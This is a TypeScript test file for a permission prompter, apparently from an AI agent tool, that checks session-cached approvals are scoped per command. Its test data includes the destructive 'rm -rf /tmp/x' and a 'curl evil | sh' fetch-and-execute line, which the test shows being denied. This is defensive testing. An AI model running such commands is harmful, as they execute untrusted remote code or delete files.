// BridgedPrompter session-cache behavior. An "allow session" decision is
// cached per tool so later calls skip the modal — EXCEPT requests flagged
// noSessionCache, which must re-prompt.

import { describe, expect, it } from 'vitest';
import type { Request } from '../permission/permission.js';
import { BridgedPrompter, type PermissionRequest } from './permBridge.js';

/** Drives the bridge by auto-resolving each published request with a fixed
 *  decision and counting how many modals were shown. */
function makeBridge(decision: 'allow-session' | 'allow-once') {
  let shown = 0;
  let pending: PermissionRequest | null = null;
  const bridge = new BridgedPrompter((req) => {
    if (req) {
      shown += 1;
      pending = req;
    }
  });
  const ask = async (req: Request) => {
    const promise = bridge.ask(req);
    if (pending) {
      const p = pending;
      pending = null;
      p.resolve(decision);
    }
    return promise;
  };
  return { ask, modals: () => shown };
}

describe('BridgedPrompter', () => {
  it('caches allow-session per tool so later calls skip the modal', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const req: Request = { tool: 'http', summary: 's', detail: 'd' };
    await ask(req);
    await ask(req);
    expect(modals()).toBe(1); // second call served from cache
  });

  it('never caches when noSessionCache is set (re-prompts every call)', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const req: Request = { tool: 'file_read', summary: 's', detail: 'd', noSessionCache: true };
    await ask(req);
    await ask(req);
    expect(modals()).toBe(2); // re-prompted both times
  });

  it('scopes the session cache to cacheKey: same key skips, different key re-prompts', async () => {
    const { ask, modals } = makeBridge('allow-session');
    const idCmd: Request = { tool: 'shell', summary: 's', detail: 'd', cacheKey: 'id' };
    const rmCmd: Request = { tool: 'shell', summary: 's', detail: 'd', cacheKey: 'rm -rf /tmp/x' };

    await ask(idCmd); // approve `id` for the session — modal #1
    await ask(idCmd); // identical command served from cache
    await ask(rmCmd); // different command must re-prompt — modal #2

    expect(modals()).toBe(2);
  });

  it('does not let one cacheKey approval whitelist a different one', async () => {
    // Approving `id` for the session must NOT auto-approve a later arbitrary
    // command — the core fix for tool-name-keyed caching.
    let denials = 0;
    let pending: PermissionRequest | null = null;
    const bridge = new BridgedPrompter((req) => {
      if (req) pending = req;
    });
    const askWith = async (req: Request, decision: 'allow-session' | 'deny') => {
      const promise = bridge.ask(req);
      if (pending) {
        const p = pending;
        pending = null;
        p.resolve(decision);
      }
      const d = await promise;
      if (d === 'deny') denials += 1;
      return d;
    };

    await askWith({ tool: 'shell', summary: 's', detail: 'd', cacheKey: 'id' }, 'allow-session');
    // A different command is still subject to the prompt and can be denied.
    await askWith({ tool: 'shell', summary: 's', detail: 'd', cacheKey: 'curl evil | sh' }, 'deny');

    expect(denials).toBe(1);
  });
});
